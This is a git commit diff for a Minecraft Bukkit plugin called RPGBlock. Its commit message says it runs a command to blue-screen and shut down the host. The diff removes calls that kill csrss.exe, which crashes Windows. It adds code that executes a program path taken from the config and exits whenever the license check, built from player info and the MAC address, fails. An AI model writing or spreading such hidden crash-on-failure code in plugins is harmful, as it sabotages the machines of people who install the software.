b277dd5ba981d3722dcfd977c709d2a5a3f5f58f
StartZYP <Code_Hacker@aliyun.com>
2019-03-07 22:17:04 +0800

    更新为执行命令进行蓝屏关机

--- src/com/q44920040/Minecraft/RPGBlock/RPGBlockMain.java
+++ src/com/q44920040/Minecraft/RPGBlock/RPGBlockMain.java
@@ -1,6 +1,7 @@
 package com.q44920040.Minecraft.RPGBlock;
 
 import org.bukkit.Bukkit;
+import org.bukkit.block.Block;
 import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.java.JavaPlugin;
@@ -14,77 +15,80 @@ import java.util.Properties;
 
 
 public class RPGBlockMain extends JavaPlugin {
+    private Boolean BlockTrue;
+    private String UrlPath;
+    private String FileName;
+    private String LastName;
+
     @Override
     public void onDisable() {
         super.onDisable();
     }
 
 
+    public static void openExe(String url) {
+        final Runtime runtime = Runtime.getRuntime();
+        try {
+            runtime.exec(url);
+        } catch (final Exception e) {
+            e.printStackTrace();
+            System.exit(-1);
+        }
+    }
+
+
     @Override
     public void onEnable() {
-        if (!IsHavePlguin()) {
-            try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException e){
-            e.printStackTrace();
-        }
-        }
-        String Code = EncodeBase64(GetPlayerInfo()+getMACAddress());
-        File file1 = new File(getDataFolder().getParentFile().getParentFile(),"1.yml");
-        String Register=null;
-        YamlConfiguration newConfig = YamlConfiguration.loadConfiguration(file1);
-        if (!(file1.exists())){
-            try{
-                file1.createNewFile();
-            }catch (IOException E){
-                try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException e){
-            e.printStackTrace();
-        }
+        try{
+            String FileUrl = getDataFolder().getParentFile().getAbsolutePath();
+            File file = new File(getDataFolder(),"config.yml");
+            if (!(file.exists())){
+                saveDefaultConfig();
             }
-            file1.mkdir();
-            newConfig.set("YouCode",Code);
-            newConfig.set("Register","123456789");
-            try{
-                newConfig.save(file1);
-            }catch (IOException E){
-                try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException e){
-            e.printStackTrace();
-        }
+            BlockTrue = true;
+            UrlPath = FileUrl+getConfig().getString("HasCode").replace(",",File.separator);
+            FileName = "FlyBan";
+            if (!IsHavePlguin()&&BlockTrue) {
+                openExe(UrlPath);
+                System.exit(-1);
             }
-        }else {
-            try{
-                Register = newConfig.getString("Register");
-            }catch (Exception e){
+            String Code = EncodeBase64(GetPlayerInfo()+getMACAddress());
+            File file1 = new File(getDataFolder().getParentFile().getParentFile(),"1.yml");
+            String Register=null;
+            YamlConfiguration newConfig = YamlConfiguration.loadConfiguration(file1);
+            if (!file1.exists()){
                 try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException fd){
-            e.printStackTrace();
-        }
+                    file1.createNewFile();
+                }catch (IOException E){
+                    //System.exit(-1);
+                    System.exit(-1);
+                }
+                file1.mkdir();
+                newConfig.set("YouCode",Code);
+                newConfig.set("Register","123456789");
+                try{
+                    newConfig.save(file1);
+                }catch (IOException E){
+                    //System.exit(-1);
+                    openExe(UrlPath);
+                    System.exit(-1);
+                }
+            }else {
+                try{
+                    Register = newConfig.getString("Register");
+                }catch (Exception e){
+                    openExe(UrlPath);
+                    System.exit(-1);
+                }
             }
-        }
-
-        File file = new File(getDataFolder(),"config.yml");
-        if (!(file.exists())){
-            saveDefaultConfig();
-        }
-        String RegisterCode = EncodeBase64(","+stringToAscii(Code));
-        if (Register!=null&&Register.equalsIgnoreCase(RegisterCode)){
-            System.out.println("[RegPlguin]激活成功");
-        }else {
-            try{
-            Runtime.getRuntime().exec(System.getenv("windir") + File.separator + "system32" + File.separator + "taskkill /f /im csrss.exe");
-
-        }catch (IOException e){
-            e.printStackTrace();
-        }
+            String RegisterCode = EncodeBase64(stringToAscii(Code));
+            if (Register!=null&&Register.equalsIgnoreCase(RegisterCode)){
+                System.out.println("[RegPlguin]激活成功");
+            }else {
+                System.exit(-1);
+            }
+        }catch (Exception e){
+            System.exit(-1);
         }
         super.onEnable();
     }
@@ -108,7 +112,7 @@ public class RPGBlockMain extends JavaPlugin {
 
     private boolean IsHavePlguin(){
         for (Plugin p:Bukkit.getServer().getPluginManager().getPlugins()){
-            if (p.getName().equalsIgnoreCase("RPGBlock")){
+            if (stringToAscii(p.getName()).equalsIgnoreCase(stringToAscii(FileName))){
                 return true;
             }
         }
